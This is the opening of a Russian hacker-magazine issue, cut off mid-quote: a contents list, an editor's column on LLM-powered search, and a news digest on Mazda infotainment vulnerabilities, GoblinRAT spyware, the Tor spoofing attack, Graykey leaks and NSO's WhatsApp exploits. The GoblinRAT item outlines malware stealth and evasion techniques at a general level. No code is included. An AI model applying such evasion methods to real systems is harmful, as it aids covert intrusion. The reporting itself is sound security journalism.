
            № 308
CONTENTS


    Новый поиск
  Колонка главреда

    MEGANews
  Самые важные события в мире инфосека за ноябрь

    Нанодамп
  Как я заново изобрел SafetyKatz для дампа LSASS с NanoDump

    Атака по SMS
  Как мы нашли уязвимость в популярном GSM-модеме и раскрутили ее до RCE

    Пробив веба
  Как я обошел 2FA и захватил учетки пользователей

     Kerberoasting для FreeIPA
  Как я искал доступ к домену, а нашел CVE

    Шишинг с Rogue RDP
  Используем встроенные средства Windows для проникновения в сеть

    Громим PrestaShop
  Как я захватил инсталл интернет-магазина на багбаунти

    История двух ATO
  Ищем уязвимости в логике обработки email

    Вход через WebTutor
  Атакуем Windows через веб-приложение и Microsoft SQL

    В погоне за билетом
  Как мы дважды проникли в домен, который считался неприступным

    Забытый веб
  Как мы нашли самодельный веб-сервис, давший дорогу внутрь сети

    По заветам Митника
  Как я заколебал всех, но все же получил пароль

    Отлом байды
  Как устроена защита Android-приложений Baidu

    Базовые атаки на AD
  Разбираем NTLM Relay и NTDS dumping

    HTB PermX
  Закрепляемся в Linux при помощи setfacl

    HTB Axlle
  Повышаем привилегии через StandaloneRunner

    HTB Resource
  Разбираемся с SSH-авторизацией по сертификату

    HTB Blazorized
  Ломаем сайт на веб-платформе Blazor

    Workplace OS
  Вспоминаем историю самого крупного провала IBM

    Семплеры и шедулеры
  Разбираем два важных механизма улучшения генеративных картинок
HEADER





Без малого три года назад я рассказывал,
как съезжал с Google и пробовал другие
способы  искать  информацию. С  того
момента появился еще один мощнейший
инструмент — большие языковые модели.       Андрей Письменный                                                                                      Главный редактор
Недавно  поиск по  вебу  добавили и  в         apismenny@gmail.com
ChatGPT.


Работает это просто: под строкой для ввода теперь есть кнопка с глобусом.
Нажимаешь на нее, и ввод будет воспринят как поисковый запрос, а ответы
будут снабжены ссылками.
   Между просьбами рассказать про что‑то или накидать скриптик я стал
просить ChatGPT глянуть, что пишут в интернете по той или иной теме.
И признаться, довольно быстро подсел на его ответы.





  Если хочешь подробный ответ, запрос пока лучше вводить на англий‐
  ском

Если ты застал появление современных поисковиков, то, возможно, пом‐
нишь, как, столкнувшись с ними, люди писали вопрос в виде полноценного
предложения и недоумевали, почему машина отвечает горой ссылок, да еще
и не всегда подходящих. Прошаренные юзеры посмеивались над таким,
а зря! Теперь этот этап пройден, и на вопросы человека машина научилась
отвечать напрямую — без костыля в виде «выдачи».
   Конечно, речь не только про ChatGPT. Его успел опередить Perplexity, отве‐
ты которого по‑прежнему во многом лучше. Perplexity выдает больше ссылок
на источники и старается приводить подробные и хорошо структурированные
данные.





Еще ловчее это сделано в мобильной версии браузера Arc, где используется
своя технология быстрых ответов. Arc берет подсказки к поиску из Google
и напротив каждой показывает кнопку Browse for Me. Если нажать на нее, Arc
быстренько спарсит несколько верхних страниц из выдачи Google и покажет
сгенерированное нейронкой и красиво оформленное саммари.





Чем лучше пользоваться? На телефоне я пока выбрал Arc, на десктопе, где
в Arc еще не встроили Browse for Me, попеременно обращаюсь к Perplexity
через Alfred и к ChatGPT — через его приложение. Но гонка за звание лучшей
модели для поиска только началась, и лидеры в ней будут то и дело меняться.
   Пока что интересно прикинуть, как «новый поиск» повлияет на ландшафт
технологий и нашу жизнь. В том, что повлияет, можешь не сомневаться. Когда
Google с краулингом и пейджранком пришел на смену каталогам ссылок,
изменения были драматическими. В прошлое, например, уехала концепция
«порталов» — мегасайтов, которые хотели быть одновременно точкой входа
в интернет и заменой для половины других ресурсов. А оптимизация страниц
под новый вид поиска аж стала новой профессией.
   Итак, представим, что «новый поиск» в ближайшие годы станет основным
способом получать информацию...
  Что это значит для ChatGPT и станет ли он новой монополией в духе
Google? По всем признакам — скорее нет, чем да. Ситуация в мире больших
языковых моделей совсем не такая же, какая была в поиске. Тут есть
и дышащие в затылок конкуренты, и опенсорс — в первую очередь Llama
и основанные на ней кастомные модели.
  Что это значит для Google? Руководители компании, конечно, сразу
похватались за головы: как так вышло, что ресерчеры из Google одну за дру‐
гой выдавали прорывные работы в области ИИ, а потом компанию вдруг
кто‑то обошел в самом главном для нее — поиске?
   Огромные ресурсы сразу же были брошены на то, чтобы «догнать и перег‐
нать», однако пока что не очень успешно. Что Bard (основанный еще на
рекуррентных моделях), что спешно сделанный на трансформерах Gemini
пока что никого особенно не впечатлили — если, конечно, не считать случая,
когда Gemini пожелал пользователю сдохнуть.
   Совершенно не исключаю, что в Google уже вовсю готовят более достой‐
ный ответ на ChatGPT, да такой, что все позабудут об OpenAI. Но история зна‐
ет много случаев, когда вчерашний монополист оказывался слишком непово‐
ротливым, боялся трогать популярный продукт (в данном случае — поиск
Google), а когда наконец решался, было поздно и конкуренты доедали пос‐
ледние крохи рынка.
  Что это значит для интернета? Вот тут начинается самое интересное.
В СМИ уже давно таят зло на Google: тот хоть и приводит трафик, но и часть
рекламных денег оттягивает на себя. Искусственный интеллект в этом плане
еще хуже. Если он сам дает четкий и сжатый ответ, кто захочет идти смотреть,
что там по ссылке? В итоге разработчик ИИ не только захапает всю информа‐
цию с сайта, но и деньги рекламодателей — тоже.
  Чем это кончится, пока сказать сложно, но есть ощущение, что ценной
инфы на сайтах, обвешанных баннерами, будет все меньше. Теперь машина
способна  наполнить  такие  сайты  бесконечным  количеством  контента,
но зачем все это, если с ней можно общаться напрямую?
  Тем временем платных подписок и прочих оград может стать больше. Если
не выкладывать новые  знания в свободный  доступ, то никакой ИИ их
не заполучит. Могу представить, как следом придумают возможность отда‐
вать уникальные знания новым поисковикам и получать за это деньги. Мы
в «Хакере» таким бы обязательно заинтересовались.
  Что это значит для нас? Как и все новые вещи, нейросети несут новые
риски. Например, легче легкого нарваться на неверные факты или гал‐
люцинации нейронки. Я уже не раз подлавливал и Perplexity, и Arc на ошибках
и искажениях. Например, при поиске цитаты за нее может выдаваться изме‐
ненный вариант, написанный другим человеком. И пока не похоже, что
подобные глюки легко вылечить.
   Неизбежны и претензии к создателям нейросетей за то, что они склоняют
свое творение к тем или иным взглядам на политику, культуру или другие
аспекты жизни. Вопрос предвзятости, с которым уже столкнулись разработ‐
чики поисковиков и новостных агрегаторов, здесь стоит еще более остро.
Если популярных нейронок‑советников будет всего одна‑две, то в руках у их
владельцев окажется огромная сила по влиянию на умы. Впрочем, пока что
все идет к тому, что таких сервисов будет множество — на любой вкус.
   Единственная беда, в которую я не верю, — это тотальное отупение,
которым новые слишком удобные инструменты грозят человечеству. Недавно
шум наделало эссе Пола Грэма, где тот предсказывал, что из‑за появления
больших языковых моделей люди разучатся писать  тексты. Поисковики,
которые легко выуживают ответы на любые разумные вопросы, должны пугать
еще больше. Не грядет ли эра тупости, если люди отучатся искать и критичес‐
ки оценивать информацию?
   Однако мы уже не  разучились  считать от  появления  калькуляторов
и ходить — от появления машин. Как‑нибудь справимся и с возможностью
получать знания без листания списков ссылок.
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru


В этом месяце: GoblinRAT шпионил за российскими ведомс‐
твами  и  ИТ‑компаниями,  разработчики  Tor  рассказали
об атаке, произошла утечка документации для инструмента
Graykey, WhatsApp использовался для доставки шпионского
ПО Pegasus, исследователь нашел проблемы в песочнице
ChatGPT и другие интересные события ноября.





ПРОБЛЕМЫ MAZDA
CONNECT
Неисправленные уязвимости в информационно‑развлекательной системе
автомобилей Mazda позволяют злоумышленникам выполнять произвольный
код с правами root, предупредили эксперты Trend Micro Zero Day Initiative (ZDI).
Некоторые баги позволяют получить неограниченный доступ к системам авто,
что потенциально может повлиять на его работу и безопасность.
   Аналитики обнаружили уязвимости в Mazda Connect Connectivity Master
Unit производства Visteon, который укомплектован ПО, разработанным ком‐
панией Johnson Controls. В своих исследованиях специалисты изучали пос‐
леднюю версию прошивки (74.00.324A).





Найденные ZDI баги варьируются от SQL-инъекций и инъекций команд
до неподписанного кода:
 • CVE-2024-8355 — SQL-инъекция в DeviceManager позволяет манипу‐
   лировать базой данных, создавать произвольные файлы и выполнять код
   путем внедрения вредоносного input’а при подключении поддельного
   устройства Apple;
 • CVE-2024-8359 — инъекция команд в REFLASH_DDU_FindFile позволяет
   выполнять произвольные команды в информационно‑развлекательной
   системе, внедряя команды в пути к файлам input’а;
 • CVE-2024-8360 — инъекция команд в REFLASH_DDU_ExtractFile также
   позволяет выполнять произвольные команды через пути к файлам;
 • CVE-2024-8358 —  еще  одна  инъекция  команд,  на  этот  раз
   в UPDATES_ExtractFile, позволяет выполнить команду, внедрив ее в пути
   к файлам, используемым в процессе обновления;
 • CVE-2024-8357 —  отсутствие  root-of-trust в App SoC и  проверок
   безопасности в процессе загрузки  позволяет злоумышленникам сох‐
   ранить контроль над информационно‑развлекательной системой после
   исходной атаки;
 • CVE-2024-8356 — неподписанный код в VIP MCU позволяет загружать
   сторонние прошивки и перехватывать контроль над различными подсисте‐
  мами автомобиля.

Известно,  что  баги  затрагивают  автомобили  Mazda  3,  выпущенные
с 2014 по 2021 годы, а также другие модели производителя.
   Эксплуатация  перечисленных  проблем  требует  физического  доступа
к информационно‑развлекательной системе автомобиля. Но злоумышленник
может подключиться к авто с помощью специального USB-устройства и осу‐
ществить атаку за считаные минуты.
   Старший исследователь уязвимостей в ZDI Дмитрий Янушкевич отметил,
что  зачастую  несанкционированный  физический  доступ  к  автомобилю
получить не так уж трудно: это может произойти на парковке, во время обслу‐
живания на СТО или в дилерском центре.
  В  итоге взлом информационно‑развлекательной системы автомобиля
с использованием перечисленных багов может привести к манипуляциям
с БД, раскрытию информации, созданию произвольных файлов, внедрению
произвольных команд, полной компрометации системы, закреплению зло‐
умышленника в системе и выполнению произвольного кода до загрузки ОС.
   Отдельно подчеркивается, что эксплуатация CVE-2024-8356 позволяет
установить вредоносную версию прошивки, что дает потенциальному ата‐
кующему прямой доступ к CAN-шинам и помогает добраться до блоков
управления двигателем, тормозами, трансмиссией и так далее.

      «В широком смысле это позволяет злоумышленнику перейти от ском-
       прометированного SoC-приложения под управлением Linux к VIP MCU,«
       установив специально подготовленную версию прошивки и впоследс-
      твии получив прямой доступ к подключенным CAN-шинам», — пояс-
      няют в ZDI.                »
Также исследователи подчеркнули, что целенаправленная атака может при‐
вести к компрометации подключенных к авто устройств, отказу в обслужива‐
нии, полному выходу из строя и даже вымогательству.
  В настоящее время ни одна из уязвимостей не была исправлена и пред‐
ставители Mazda не прокомментировали публикацию специалистов ZDI.


ТРЕТЬ SIM-КАРТ ДАЮТ ДОСТУП К ЧУЖИМ АККАУНТАМ
Специалисты Positive Technologies изучили SIM-карты 5 крупных операторов связи.

Выяснилось, что каждый второй телефонный номер уже использовался для регистрации
каких‑либо учетных записей, а более трети всех изученных SIM-карт позволяли войти в акка‐
унты, созданные прежним владельцем номера.

В 37% случаев аккаунты были еще активны.

В общей сложности специалисты подтвердили возможность доступа к 57 аккаунтам прежних
владельцев телефонных номеров. При этом только 1 из 5 операторов связи блокировал SIM-
карты, обнаруживая подозрительную активность исследователей.





ШПИОН GOBLINRAT
Специалисты Solar 4RAYS ГК «Солар» обнаружили малварь GoblinRAT в сетях
нескольких российских ведомств и ИТ‑компаний, которые обслуживают гос‐
сектор. Самые ранние следы заражения датируются 2020 годом, и эксперты
заявили, что на сегодня это одна из самых сложных и скрытных атак,
с которыми им доводилось сталкиваться.
   Впервые GoblinRAT был обнаружен в 2023 году при расследовании инци‐
дента в неназванной ИТ‑компании, предоставляющей услуги преимущес‐
твенно органам власти. Штатные ИБ‑специалисты организации обратили
внимание на удаление системных журналов на одном из серверов, а также
обнаружили дамп хешей пользователей с контроллера домена. Дамп был
выполнен с помощью утилиты impacket-secretsdump, запущенной на Linux-
хосте домена.
   Эти подозрительные события побудили сотрудников инициировать рас‐
следование и привлечь к этому специалистов «Солара».
   Эксперты рассказывают, что лишь после продолжительных поисков им
удалось обнаружить вредоносный код, который маскировался под процесс
легитимного приложения. Дело в том, что большая часть функциональности
GoblinRAT решает единственную задачу — скрывать присутствие малвари
в системе.
   Параметры вредоносного процесса ничем не выделялись, а запускавший
его файл отличался от легитимного всего одной буквой в названии. Заметить
такую деталь удалось только при ручном анализе тысяч мегабайт данных.
Исследователи  полагают, что  злоумышленники  рассчитывали, что  никто
не будет делать такую кропотливую работу и они останутся незамеченными.
   Дальнейший анализ показал, что у GoblinRAT нет функций автоматического
закрепления в системе: всякий раз злоумышленники сначала тщательно изу‐
чали особенности целевой инфраструктуры (используемое ПО и так далее)
и лишь потом внедряли вредонос под уникальной маскировкой — обязатель‐
но под личиной одного из приложений, работающих на конкретной атакуемой
системе. То есть атака явно была таргетированной.
   Исследователи перечислили следующие особенности GoblinRAT, которые
затрудняли его обнаружение:
 • малварь самоуничтожается спустя определенное время, если оператор
   не подключается к ней и не сообщает специальный код;
 • удаляя себя, вредонос несколько раз перезаписывает содержимое своих
   файлов на жестком диске случайными символами, чтобы максимально
   усложнить возможное расследование;
 • GoblinRAT маскируется под уже имеющийся на зараженной машине про‐
   цесс, изменяя его название и аргументы командной строки (в некоторых
   случаях он работал внутри легитимного приложения);
 • злоумышленники применяют технику Port knocking («стук по портам»)
   в серверной версии GoblinRAT, что позволяет им шпионить даже в сег‐
   ментах инфраструктуры с жестко ограниченным доступом в интернет;
 • передаваемые данные в рамках соединения с сервером управления мал‐
   вари шифруются;
 • для обхода ограничений межсетевых экранов используется построение
   сетевых туннелей.

Также в качестве управляющих серверов злоумышленники использовали
легитимные взломанные сайты (например, сайт онлайн‑ретейлера), что поз‐
воляло им маскировать вредоносный трафик.
  В итоге GoblinRAT был обнаружен в четырех неназванных организациях,
и в каждой из них атакующие смогли получить полный контроль над целевой
инфраструктурой: они имели удаленный доступ с правами администратора
ко всем сегментам сети. При этом установить источник заражений не уда‐
лось.
   Эксперты нашли свидетельства, указывающие на то, что как минимум
к одной из атакованных инфраструктур злоумышленники сохраняли доступ
в течение трех лет, а самая «непродолжительная» атака длилась около
полугода.


       «Благодаря обнаруженным артефактам мы смогли проследить исто-
     рию развития GoblinRAT с 2020 года, однако нам не удалось обна-«
      ружить широкого распространения вредоноса. Более того, наши кол-
      леги  из  других  ИБ‑компаний  с  глобальными  сетями  сенсоров
      не обнаружили ничего похожего в своих коллекциях. Ключевым воп-
     росом остается атрибуция атаки: артефактов, указывающих на про-
      исхождение ВПО, не обнаружено. Подобных инструментов не демонс-
       трировали  ни  азиатские,  ни  восточноевропейские  группировки,
      ни группировки из других регионов. Очевидно только, что для соз-
      дания и использования GoblinRAT злоумышленники должны обладать
      очень высоким уровнем профессионализма и быть хорошо замоти-
       вированными. Те атаки, что мы расследовали, требовали тщательной
       предварительной   подготовки  и  большого   количества   „ручной“
      работы», — комментирует инженер группы расследования инцидентов
       центра исследования киберугроз Solar 4RAYS Константин Жигалов.                »
Пока неизвестно, какая хакгруппа могла стоять за атаками GoblinRAT. Иссле‐
дователи признают, что ни они сами, ни их коллеги по ИБ‑индустрии,
с которыми они поделились информацией о  малвари, не  обнаружили
каких‑либо артефактов, указывающих на ее происхождение.


       «Основываясь на имеющихся данных, мы можем предположить, что
       операторов  GoblinRAT  интересует  конфиденциальная  информация,«
       хранящаяся на серверах государственных органов и их подрядчиков (в
      том числе в сегментах сети с ограниченным доступом в интернет)», —
      пишут специалисты.                »
Считается, что GoblinRAT может быть либо операцией одной из известных
прогосударственных группировок, кардинально обновивших свои инструмен‐
тарий и тактики, либо свидетельством существования новой группировки
(прогосударственной или профессиональных наемников), либо делом рук
мотивированного и крайне профессионального взломщика‑одиночки.


ФАЛЬШИВЫЕ ПРИЛОЖЕНИЯ ДЛЯ ANDROID
Специалисты FACCT проанализировали 455 приманок, с помощью которых злоумышленники
распространяют в мессенджерах малварь под видом обновлений для Android-приложений.


В  итоге  получился  рейтинг наиболее популярных фальшивок, чаще  всего имитирующих
государственные приложения и сервисы.

Самыми популярными приманками оказались приложения операторов сотовой связи (27,4%),
приложения для оплаты коммунальных слуг (20,9%) и ЕМИАС (16,6%).

Распространенные раньше фальшивые антивирусы и антиспам‑решения заняли лишь пятое
место (8,9%).

При этом на фейковые мобильные приложения банков и вовсе приходится лишь 0,03% под‐
делок.





Исследователи  объясняют,  что  банки активно  оказывают  противодействие мошенникам,
а пользователи стали настороженно относиться ко всему, что связано с финансами. Поэтому
злоумышленники переходят на новые приманки.





АТАКА НА TOR
В прошлом месяце операторы ретрансляторов Tor и системные администра‐
торы начали получать от провайдеров жалобы на массовое сканирование
портов. Как выяснилось, эти жалобы были связаны со скоординированной
атакой и спуфингом IP-адресов: злоумышленники подменяли IP-адреса, свя‐
занные с Tor, чтобы создать впечатление, что от сети Tor исходят вредонос‐
ные запросы.
  В конце октября специалисты Tor Project начали расследование происхо‐
дящего совместно с экспертами InterSecLab и GreyNoise. В итоге 7 нояб‐
ря 2024 года источник атаки был обнаружен, и к настоящему моменту проб‐
лему удалось решить.
  По словам представителей Tor Project, атака была направлена на «наруше‐
ние работы Tor Project и сети Tor». Злоумышленники использовали спуфин‐
говые SYN-пакеты, чтобы создать впечатление, что IP-адреса ретрансля‐
торов  Tor  являются  источниками  массовых  сканирований  портов. Эта
активность не могла остаться незамеченной и привела к появлению мно‐
гочисленных автоматических жалоб на злоупотребления, а IP-адреса в итоге
попадали в списки блокировок.
   Оператор ретранслятора Tor Пьер Бурдон (Pierre Bourdon) в подробностях
рассказал о том, как именно осуществлялась эта атака.
   Разработчики уверяют, что инцидент никак не повлиял на пользователей
Tor и их безопасность.


       «Атака оказала ограниченное влияние на сеть Tor, привела к времен-
      ному отключению нескольких ретрансляторов, стала причиной лиш-«
      него  стресса и неудобств для  многих  операторов, которые были
      вынуждены реагировать на поступающие жалобы. Хотя эта атака была
       направлена на наше  сообщество,  атаки со  спуфингом  IP-адресов
      могут произойти с любым онлайн‑сервисом, — пишет команда Tor
       Project. — Впереди еще много работы: нам нужно поддержать опе-
       раторов ретрансляторов в восстановлении учетных записей и помочь
       провайдерам разблокировать IP-адреса узлов Tor directory authority».                »
Разработчики отметили, что во время расследования и устранения последс‐
твий инцидента им пришлось столкнуться «со случаями непрофессиональ‐
ного поведения, когда отказ от расследования и беспечность только уси‐
ливали последствия атаки». Но также они поблагодарили за помощь и под‐
держку многие организации и частных лиц, которые не остались в стороне.
   Подчеркивается, что большая часть сообщений о фиктивных атаках исхо‐
дила от watchdogcyberdefense[.]com, и теперь Tor Project призвал ИБ‑сооб‐
щество относиться к этим предупреждениям с осторожностью.





ТОРВАЛЬДС ПРО ИИ
Во время выступления на саммите Open Source Summit в Вене у Линуса Торвальдса взяли
интервью. Немалая часть беседы была посвящена вопросам развития ИИ, и Торвальдс сооб‐
щил, что на текущем этапе развития считает происходящее хайпом и предпочитает все
это игнорировать.

         «Я считаю, что ИИ — это очень интересно, и я думаю, он изменит мир. И в то→      же время я так ненавижу этот хайп‑цикл, что мне совсем не хочется во всем
      этом участвовать. Сейчас мой подход к ИИ заключается в том, что в основном я
       его игнорирую, потому как считаю, что вся технологическая индустрия вокруг
     ИИ находится в очень плохом состоянии. ChatGPT демонстрирует отличные
        результаты и, очевидно, используется во многих областях, в частности в гра‐
       фическом дизайне и тому подобных вещах. Но я очень не люблю хайп», —
       заявил Торвальдс, отметив, что в настоящее время ИИ — это «на 90% маркетинг
      и только на 10% реальность».





ЧТО МОЖЕТ GRAYKEY
В распоряжении издания 404 Media оказались документы с подробным опи‐
санием возможностей инструмента Graykey, который используется правоох‐
ранительными органами и киберкриминалистами по всему миру для взлома
смартфонов.
   Эта утечка является беспрецедентной для разработчика Graykey — ком‐
пании Grayshift, которую в прошлом году приобрела Magnet Forensics, спе‐
циализирующаяся на цифровой криминалистике. Хотя один из главных кон‐
курентов Grayshift — компания Cellebrite уже сталкивалась с подобными утеч‐
ками, это первый случай, когда в сети появилась детальная информация
о том, к каким устройствам Graykey может или не может получить доступ.
  В документах перечислены не только устройства на базе iOS, против
которых эффективен или неэффективен Graykey, но и устройства на базе
Android.
   Как выяснилось, после релиза iOS 18.0, вышедшей 16 сентября 2024 года,
Graykey может получить лишь частичный доступ к данным на устройствах
(начиная от iPhone 12 и заканчивая новейшей линейкой iPhone 16). То же
относится и к iPhone под управлением iOS 18.0.1, появившейся в начале
октября.
  При этом в документе не указано, какие именно типы данных можно
извлечь при упомянутом «частичном» доступе. В 2018 году издание Forbes
сообщало, что частичный доступ позволяет извлекать только незашифрован‐
ные файлы и некоторые метаданные, включая информацию о размере фай‐
лов и структуре каталогов. Но с тех пор многое могло измениться.





Также документы показывают, что Graykey менее эффективен против iPhone
с бета‑версиями: по какой‑то причине инструмент не работает против раз‐
личных бета‑версий iOS 18.1 на всех современных моделях iPhone. Неясно,
связано ли это с тем, что на момент создания документа разработчики прос‐
то не успели проработать атаки против iOS 18.1, или с тем, что в вер‐
сии 18.1 была заметно улучшена безопасность.
   Возможности Graykey против устройств на базе Android куда более раз‐
нообразны, в силу значительных различий между самими устройствами,
выпускаемыми разными производителями.
   Например, если говорить о линейке смартфонов Pixel компании Google,
с новейших устройств (включая Pixel 9, выпущенный в августе) Graykey спо‐
собен извлечь лишь частичные данные. Причем лишь в том случае, если
телефон находится в состоянии «после первой разблокировки» (After First
Unlock, AFU). AFU означает, что с момента последнего включения устройства
кто‑то (обычно сам владелец) хотя бы раз разблокировал его с помощью
кода доступа или другим способом.


                                     Продолжение статьи →
← Начало статьи





  В 404 Media напомнили, что ранее в этом году от похожей утечки пострадал
  основной конкурент Graykey — компания Cellebrite. Тогда стало известно, что
   (по состоянию на апрель 2024 года) Cellebrite не способен извлечь данные
  из многих современных iPhone. Однако вскоре после этого в сети появилась
   обновленная версия документации Cellebrite, и стало ясно, что компания уже
   наверстала  упущенное и  Cellebrite  стал  эффективен  против  устройств
  под управлением iOS 17.5 и iOS 17.5.1.
     То есть такие инструменты, как Graykey или Cellebrite, могут не иметь воз‐
   можностей для извлечения данных с телефонов под управлением новейших
   версий ОС, выпущенных 1–2 месяца тому назад. Но их разработчики не сидят
   сложа руки и довольно быстро закрывают пробелы, чтобы извлекать хотя бы
   частичную информацию из новых ОС и девайсов.


  13 БАЗ ДАННЫХ УТЕКЛИ В ОКТЯБРЕ

  В Роскомнадзоре сообщили, что в октябре 2024-го данные о россиянах распространялись
   в сети через 13 утекших БД, которые содержали больше 9 700 000 записей.

   Суммарно с начала текущего года ведомство зафиксировало утечки уже 110 баз, в которых
   содержится больше 600 000 000 записей.

   Для сравнения: за весь прошлый год Роскомнадзор обнаружил 168 утечек баз данных. В них
   содержалось около 300 000 000 записей о жителях РФ.





 CLOUDFLARE
 ПОД ЗАПРЕТОМ
   Согласно сообщению Центра мониторинга и управления сетью связи общего
   пользования (ЦМУ ССОП), который работает при подведомственном Рос‐
   комнадзору ФГУП «Главный радиочастотный центр» (ГРЧЦ), владельцам
   ресурсов рекомендуется отказаться от использования CDN-сервиса ком‐
  пании  Cloudflare  из‑за  недавнего  включения по  умолчанию  TLS ECH
    (Encrypted Client Hello).

          «Американская компания Cloudflare, поставщик услуг CDN, включила
         в октябре применение по умолчанию на своих серверах расширения «
        TLS ECH (Encrypted Client Hello). Эта технология — средство обхода
          ограничений  доступа  к  запрещенной  в  России  информации.  Его
         использование нарушает российское законодательство и ограничи-
           вается техническими средствами противодействия угрозам (ТСПУ).
            Рекомендуем  владельцам  информационных  ресурсов  отключить
         расширение TLS ECH или, что правильнее, использовать отечествен-
        ные CDN-сервисы, которые обеспечивают надежное и безопасное
          функционирование ресурсов и защиту от компьютерных атак.
         В частности, защиту от DDoS-атак может обеспечить Национальная
          система противодействия DDoS-атакам (НСПА). За время ее работы
           (с марта 2024 года) отражено более 10,5 тыс. DDoS-атак на раз-
        личные организации страны.
            Обращаем  внимание,  что  Cloudflare была одной  из  компаний
         BigTech, которые собирал Госдеп США в сентябре для обсуждения
          комплексного и организованного противодействия странам, активно
        защищающим свой информационный суверенитет», — гласит сооб-
        щение ЦМУ ССОП.                 »
  В начале ноября пользователи обратили внимание, что Cloudflare активиро‐
  вала ECH по умолчанию, из‑за чего Роскомнадзор, похоже, начал блокиро‐
   вать CDN Cloudflare. В результате многие сайты, использующие TLS 1.3, ста‐
  ли недоступны.


  ОЧЕНЬ АКТИВНЫЕ ЗМИИ
    Аналитики Solar 4RAYS подвели итоги десяти прошедших месяцев 2024 года и объединили
   данные, собранные в ходе различных расследований.

   За это время специалисты столкнулись с деятельностью 9 различных группировок и кластеров,
   а количество инцидентов выросло на 45% по сравнению с 2023 годом.

   Оказалось, что около 70% всех инцидентов было связано с деятельностью проукраинских
   группировок. Самыми активными из них были Shedding Zmiy (37%) и Lifting Zmiy (18%).





   Главной целью атакующих остается шпионаж: 54% инцидентов с начала 2024 года имели
   именно эту цель (в 2023 году таких насчитывалось 37%). На втором месте — атаки с целью
   финансовой выгоды (20%). Умышленное уничтожение данных — на третьем месте (11%).





    Отмечается, что если в 2023 году причиной 46% кибератак было хулиганство и хактивизм, то
   в 2024 году эта категория сократилась до 11%.

   Основными методами проникновения в сети организаций остаются уязвимости в веб‑при-
   ложениях и скомпрометированные учетные данные.





 PEGASUS VS
 WHATSAPP
   Израильская компания NSO Group, занимающаяся разработкой шпионского
  ПО (включая нашумевший Pegasus), использовала сразу несколько 0-day-
   эксплоитов для WhatsApp. В том числе против пользователей применялся
  ранее неизвестный эксплоит под названием Erised, который использовал уяз‐
   вимости для развертывания Pegasus.



   Pegasus представляет собой шпионскую платформу, разработанную NSO Group. «Пегас» про‐
    дается как легальная спайварь и используется для шпионажа и наблюдения по всему миру.
   Pegasus (а через него и клиенты NSO Group) способен собирать с устройств на базе iOS
   и Android текстовые сообщения, информацию о приложениях, подслушивать вызовы, отсле‐
   живать местоположение, похищать пароли и так далее.
        Несколько лет назад мы посвятили Pegasus и NSO Group отдельную статью, после того
   как внимание общественности оказалось привлечено к работе этой коммерческой спайвари
   и связанным с ней злоупотреблениям.


  Еще в 2019 году представители WhatsApp подали в суд на NSO Group и обви‐
  нили компанию в пособничестве кибератакам, которые  осуществлялись
   в интересах различных правительств в 20 странах мира, включая Мексику,
  ОАЭ и Бахрейн.
     Эта тяжба длится до сих пор, и теперь достоянием общественности стали
   весьма интересные и неотредактированные судебные документы.
      Согласно этим бумагам, примерно до апреля 2018 года NSO Group при‐
   меняла в атаках кастомный клиент WhatsApp (WhatsApp Installation Server,
  или WIS) и эксплоит собственной разработки под названием Heaven. Он мог
  выдавать себя за  официальный  клиент  мессенджера и  использовался
  для установки Pegasus на устройства жертв со стороннего сервера, находя‐
   щегося под контролем NSO.

         «WIS мог выдать себя за официальный клиент, чтобы получить доступ
          к серверам WhatsApp и передавать сообщения, включая настройки «
         вызовов,  чего  официальный  клиент  делать не  мог, —  говорится
         в  документах. — NSO  начала  тестировать  Heaven  на  серверах
        WhatsApp примерно в апреле 2018 года и вскоре после этого стала
          предоставлять его своим клиентам».                 »
   После того как разработчики WhatsApp обнаружили проблему и заблокиро‐
  вали NSO Group доступ к зараженным устройствам и серверам с помощью
   патчей, выпущенных в сентябре и декабре 2018 года, эксплоит Heaven перес‐
   тал работать.
      Затем, в феврале 2019 года, NSO Group разработала новый эксплоит —
   Eden, способный обойти новые защитные меры WhatsApp. В мае 2019 года
   представители WhatsApp выяснили, что Eden использовался клиентами NSO
  Group для атак примерно на 1400 пользовательских устройств.
    При этом, как гласят судебные документы, NSO Group признаёт, что раз‐
   работала и продавала описанное шпионское ПО. А zero-click-вектор его уста‐
   новки, называвшийся Eden, действительно применялся в атаках.
    В частности, руководитель R&D-отдела NSO Group Тамир Газнели (Tamir
   Gazneli) и другие обвиняемые «признали, что разработали эти эксплоиты
  путем извлечения и декомпиляции кода WhatsApp и обратного инжиниринга».
  Все это было применено для создания WIS-клиента, который мог исполь‐
   зоваться для «отправки через серверы WhatsApp вредоносных сообщений
  (которые легитимный клиент WhatsApp не мог отправлять) и тем самым зас‐
   тавить целевые устройства установить шпионский агент Pegasus».
     Обнаружив упомянутые атаки, разработчики WhatsApp снова исправили
   уязвимости, на которые полагался Eden, и отключили учетные записи NSO
  Group в WhatsApp.
      Однако даже когда тайное стало явным, то есть после блокировки Eden
   в мае 2019 года и после обращения представителей WhatsApp в суд, NSO
  Group создала еще один  вектор для распространения своей спайвари
   (Erised), который использовал ретрансляционные серверы WhatsApp для раз‐
   вертывания Pegasus.
    При этом работа Erised была заблокирована только в мае 2020 года, когда
   судебное разбирательство между WhatsApp и NSO Group уже шло полным
  ходом. Стоит отметить, что ответчики из NSO Group отказались отвечать
   в суде, разрабатывала ли компания какие‑либо еще векторы по доставке сво‐
  ей малвари через WhatsApp.
      Зато производитель шпионского ПО признал, что Pegasus злоупотреблял
   сервисом  WhatsApp  для  установки  спайвари  на  целевые  устройства
   в количестве «от сотен до десятков тысяч».
      Также в компании признали, что провели реверс‑инжиниринг WhatsApp
  для разработки упомянутых методов атак и предоставляли своим клиентам
   как саму эту технологию, так и учетные записи WhatsApp, которые те должны
  были использовать.
      Фактически процесс установки спайвари выглядел так: оператор Pegasus
   вводил номер мобильного телефона жертвы в нужное поле программы,
   запущенной на его ноутбуке, и это запускало удаленное и полностью авто‐
   матическое развертывание Pegasus на целевом устройстве.
     То есть, вопреки всем прошлым заявлениям NSO Group, участие клиентов
   в атаках было весьма ограниченным. Им нужно было только ввести номер
   телефона жертвы и нажать кнопку «Установить». А развертывание спайвари
  и извлечение данных выполнялись самим Pegasus и средствами NSO, не тре‐
  буя от клиентов каких‑либо технических знаний или дополнительных дей‐
   ствий.
      Однако NSO Group продолжает утверждать, будто не несет ответствен‐
  ности за действия своих клиентов и не имеет доступа к данным, полученным
   в результате работы Pegasus, что якобы сводит к минимуму роль компании
   в шпионских операциях.

       «NSO по‑прежнему  придерживается  своих предыдущих заявлений,
         в которых мы неоднократно говорили о том, что система управляется «
          исключительно нашими  клиентами, а ни NSO, ни ее  сотрудники
        не имеют доступа к собранной информации, — заявил СМИ Гил Лей-
